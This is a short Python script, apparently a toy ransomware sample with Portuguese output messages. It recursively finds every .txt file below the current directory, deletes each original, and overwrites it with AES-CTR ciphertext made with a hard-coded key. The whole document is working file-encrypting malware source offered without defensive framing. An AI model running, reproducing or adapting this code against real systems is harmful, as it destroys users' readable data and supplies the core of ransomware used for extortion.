import os
from pathlib import Path
import pyaes

p = Path('.')

key = b"txtBlackHolexxxx"

for i in p.glob('**/*.txt'):
    with open(i, "r") as file:
        file_data = file.read()

    os.remove(i)
    print(f"Arquivo original removido: {i}")

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)
        

    with open(i, 'wb') as new_file:
        new_file.write(crypto_data)
       
